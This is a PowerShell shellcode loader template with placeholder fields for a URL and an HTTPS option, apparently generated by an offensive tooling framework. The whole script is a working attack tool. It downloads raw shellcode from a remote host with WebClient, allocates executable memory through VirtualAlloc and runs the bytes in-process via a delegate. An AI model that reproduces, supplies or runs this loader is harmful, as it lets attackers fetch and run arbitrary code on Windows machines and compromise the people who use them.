# HTTPS bypass if needed
%%isHTTPS%%
# Define URL for the shellcode
$url = "%%url%%"

# Download shellcode using WebClient
$webClient = New-Object System.Net.WebClient
$shellcode = $webClient.DownloadData($url)

# Allocate memory for shellcode
$size = $shellcode.Length
if ([IntPtr]::Size -eq 8) {
    $virtAlloc = @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
"@
} else {
    $virtAlloc = @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
"@
}

$kernel32 = Add-Type -MemberDefinition $virtAlloc -Name "Kernel32" -Namespace "Win32" -PassThru

# Convert size to UIntPtr if running in 32-bit mode
if ([IntPtr]::Size -eq 4) {
    $size = [UIntPtr]::new($size)
}

$mem = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)

# Copy shellcode to allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [IntPtr]$mem, $shellcode.Length)

# Define delegate for executing shellcode
$delegateType = Add-Type @"
using System;
using System.Runtime.InteropServices;

public delegate void ShellcodeDelegate();
"@ -PassThru

# Create delegate instance and invoke it
$shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([IntPtr]$mem, [ShellcodeDelegate])
$shellcodeDelegate.Invoke()